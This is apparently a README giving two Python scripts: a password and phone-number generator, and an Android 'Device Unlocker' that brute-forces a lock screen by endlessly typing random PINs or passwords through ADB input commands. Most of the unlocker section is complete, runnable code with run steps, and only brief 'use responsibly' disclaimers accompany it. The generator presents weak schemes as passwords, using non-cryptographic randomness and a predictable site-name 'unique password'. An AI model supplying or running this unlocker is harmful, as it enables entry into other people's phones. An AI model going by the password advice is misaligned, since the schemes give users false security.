# Password Generator and Device Unlocker Documentation

## Overview

This documentation provides guidance on how to use the **Password Generator** and **Device Unlocker** scripts. These scripts are designed to generate various types of passwords and unlock an Android device using ADB (Android Debug Bridge) commands.

### Script 1: Password Generator

The Password Generator script allows users to generate different types of passwords, including:

1. 4-digit numbers
2. 6-digit numbers
3. Small alphabet passwords
4. Big alphabet passwords
5. Mixed-character passwords
6. Unique passwords for specific purposes
7. Random phone numbers

### Script 2: Device Unlocker

The Device Unlocker script uses ADB commands to attempt unlocking an Android device by trying various password combinations generated by the Password Generator script.

---

## Script 1: Password Generator

### Class: `Passwords`

This class provides methods for generating various passwords and phone numbers.

#### Methods

- **`four_digit(self) -> str`**  
  Generates a random 4-digit number.  
  **Returns:** A string representing the 4-digit password.

- **`six_digit(self) -> str`**  
  Generates a random 6-digit number.  
  **Returns:** A string representing the 6-digit password.

- **`small_characters(self, length: int) -> str`**  
  Generates a random password consisting of lowercase letters.  
  **Parameters:**  
  - `length`: The length of the password.  
  **Returns:** A string representing the generated password.

- **`big_characters(self, length: int) -> str`**  
  Generates a random password consisting of uppercase letters.  
  **Parameters:**  
  - `length`: The length of the password.  
  **Returns:** A string representing the generated password.

- **`mixed_characters(self, length: int) -> str`**  
  Generates a random password consisting of mixed characters (letters, numbers, and symbols).  
  **Parameters:**  
  - `length`: The length of the password.  
  **Returns:** A string representing the generated password.

- **`phone_number(self) -> str`**  
  Generates a random phone number with a specific prefix.  
  **Returns:** A string representing the generated phone number.

- **`unique_password(self, password_for: str = "Google") -> str`**  
  Generates a unique password for a specific purpose.  
  **Parameters:**  
  - `password_for`: The purpose or context for the password (default is "Google").  
  **Returns:** A string representing the unique password.

### How to Use the Password Generator

1. **Install Python:** Ensure Python is installed on your system.
2. **Create a Python file:** Save the following code as `Passwords.py`.

```python
import random

class Passwords:
    def __init__(self):
        self._lower_number = '0123456789'
        self._lower_letter = 'abcdefghijklmnopqrstuvwxyz'
        self._upper_letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        self._symbols = '!@#$%^&*()_+=-'
        self._mix_number = "qwertyuiopasdfghjklzxcvbnmASDFGHJKLPOIUYTREWQZXCVBNM1234567890-=[]|;'./,<>?:{}+_!@#$%^&*()"
        self._phone_number = [90, 96, 99, 80, 62, 85]

    def four_digit(self):
        return str(random.randint(1000, 9999))

    def six_digit(self):
        return str(random.randint(100000, 999999))

    def small_characters(self, length):
        return ''.join(random.choice(self._lower_letter) for _ in range(length))

    def big_characters(self, length):
        return ''.join(random.choice(self._upper_letter) for _ in range(length))

    def mixed_characters(self, length):
        return ''.join(random.choice(self._mix_number) for _ in range(length))

    def phone_number(self):
        pre = random.choice(self._phone_number)
        suff = random.randint(10000000, 99999999)
        return f"+91{str(pre) + str(suff)}"

    def unique_password(self, password_for="Google"):
        chr = "#@*& "
        length = len(password_for)
        a = random.choice(chr)
        alg = length * (length - 1)
        alg2 = int(alg / 2)

        b = random.choice(chr)
        total = f"{password_for}-{a * 3}{alg2}{b * 3}"
        return total

def password_generator_menu():
    passwd = Passwords()

    menu = """
    ▓▓▓ Password Generator Menu ▓▓▓

    1. Generate 4-digit Number
    2. Generate 6-digit Number
    3. Generate Small Alphabet Password
    4. Generate Big Alphabet Password
    5. Generate Mixed-Character Password
    6. Generate Unique Password
    7. Generate Random Phone Number

    Select an option (1-7):
    """

    choice = int(input(menu))
    
    if choice == 1:
        print("4-digit password:", passwd.four_digit())

    elif choice == 2:
        print("6-digit password:", passwd.six_digit())

    elif choice == 3:
        length = int(input("Enter the length of your password: "))
        print("Small alphabet password:", passwd.small_characters(length))

    elif choice == 4:
        length = int(input("Enter the length of your password: "))
        print("Big alphabet password:", passwd.big_characters(length))

    elif choice == 5:
        length = int(input("Enter the length of your password: "))
        print("Mixed-character password:", passwd.mixed_characters(length))

    elif choice == 6:
        password_for = input("Enter the purpose of the unique password (e.g., Google): ")
        print("Unique password:", passwd.unique_password(password_for))

    elif choice == 7:
        print("Generated phone number:", passwd.phone_number())

    else:
        print("Invalid Choice")

if __name__ == "__main__":
    password_generator_menu()
```

3. **Run the Script:** Execute the script using Python to see the menu and generate passwords.

```bash
python password_generator.py
```

---

## Script 2: Device Unlocker

### Functionality

This script uses ADB commands to unlock an Android device by attempting various password combinations generated using the `Passwords` class.

### How to Use the Device Unlocker

1. **Install ADB:** Ensure that ADB is installed and set up on your system.
2. **Connect Device:** Connect your Android device to your computer via USB and ensure USB debugging is enabled on the device.
3. **Create a Python file:** Save the following code as `device_unlocker.py`.

```python
import subprocess
from Passwords import Passwords  # Ensure Passwords.py is in the same directory

def unlock_device_with_password(password):
    # Input the password via adb shell input text
    cmd_input_password = f"adb shell input text {password}"
    subprocess.run(cmd_input_password, shell=True)

    # Simulate pressing the Enter key via adb shell input keyevent
    cmd_press_enter = "adb shell input keyevent 66"
    subprocess.run(cmd_press_enter, shell=True)

def unlock_device_menu():
    passwd = Passwords()

    menu = """
    ▓▓▓ Device Unlocker Menu ▓▓▓

    1. Unlock with 4-digit Number
    2. Unlock with 6-digit Number
    3. Unlock with Small Alphabet Password
    4. Unlock with Big Alphabet Password
    5. Unlock with Mixed-Character Password

    Select an option (1-5):
    """

    choice = int(input(menu))
    
    if choice == 1:
        while True:
            password = passwd.four_digit()
            unlock_device_with_password(password)

    elif choice == 2:
        while True:
            password = passwd.six_digit()
            unlock_device_with_password(password)

    elif choice == 3:
        length = int(input("Enter the length of your password: "))
        while True:
            password = passwd.small_characters(length)
            unlock_device_with_password(password)

    elif choice == 4:
        length = int(input("Enter the length of your password: "))
        while True:
            password = passwd.big_characters(length)
            unlock_device_with_password(password)

    elif choice == 5:
        length = int(input("Enter the length of your password: "))
        while True:
            password = passwd.mixed_characters(length)
            unlock_device_with_password(password)

    else:
        print("Invalid Choice")

if __name__ == "__main__":
    unlock_device_menu()
```

4. **Run the Script:** Execute the script using Python to choose an unlocking method.

```bash
python device_unlocker.py
```

### Important Notes

- **Caution:** Continuously trying passwords on a device can trigger security mechanisms, such as data wipe or account lockout. Use this script responsibly.
- **Ensure Compatibility:** This script is designed for educational and testing purposes. Ensure that it suits your device's security settings and requirements.

---

## Conclusion

This documentation provides a clear understanding of how to use the Password Generator and Device Unlocker scripts. They offer a variety of password generation techniques and an automated unlocking approach using ADB.

### Next Steps

- **Customize Passwords:** Modify the `Passwords` class to add additional complexity or new password types.
- **Enhance Security:** Incorporate additional checks and balances to ensure the scripts areused responsibly and do not compromise device security.

### Enhancements and Extensions

1. **Additional Password Types:**
   - You can add more password generation methods in the `Passwords` class, such as alphanumeric passwords or specific patterns.

2. **User Interface:**
   - Implement a graphical user interface (GUI) for a more user-friendly experience using libraries like Tkinter or PyQt.

3. **Error Handling:**
   - Add error handling to manage situations where the ADB commands might fail or the device is not properly connected.

4. **Logging:**
   - Implement logging to keep track of attempted passwords and actions performed by the script. This can be helpful for debugging and monitoring.

5. **Security Measures:**
   - Implement security measures to ensure that the script does not lock the device or trigger unwanted security responses.

---

## Example Usage

Here is a step-by-step example of how to use both scripts:

### Example 1: Generating a Password

1. **Run the Password Generator Script:**
   ```bash
   python password_generator.py
   ```

2. **Follow the On-Screen Menu:**
   ```
   ▓▓▓ Password Generator Menu ▓▓▓

   1. Generate 4-digit Number
   2. Generate 6-digit Number
   3. Generate Small Alphabet Password
   4. Generate Big Alphabet Password
   5. Generate Mixed-Character Password
   6. Generate Unique Password
   7. Generate Random Phone Number

   Select an option (1-7):
   ```

3. **Choose an Option:**
   - For example, choose `1` to generate a 4-digit number.

4. **View the Result:**
   - The generated 4-digit password will be displayed.

### Example 2: Unlocking a Device

1. **Run the Device Unlocker Script:**
   ```bash
   python device_unlocker.py
   ```

2. **Follow the On-Screen Menu:**
   ```
   ▓▓▓ Device Unlocker Menu ▓▓▓

   1. Unlock with 4-digit Number
   2. Unlock with 6-digit Number
   3. Unlock with Small Alphabet Password
   4. Unlock with Big Alphabet Password
   5. Unlock with Mixed-Character Password

   Select an option (1-5):
   ```

3. **Choose an Option:**
   - For example, choose `1` to attempt unlocking with 4-digit numbers.

4. **Monitor the Process:**
   - The script will continuously try different 4-digit passwords until it succeeds or you stop the script.

---

## Conclusion

This documentation provides a comprehensive guide on using and extending the Password Generator and Device Unlocker scripts. These scripts are powerful tools for generating passwords and automating the unlocking process for Android devices via ADB.

### Reminder

- **Use Responsibly:** Always ensure that you have permission to unlock the device and that you are complying with all relevant security and legal guidelines.
- **Customize as Needed:** Feel free to modify and extend the scripts to better suit your needs and enhance their functionality.
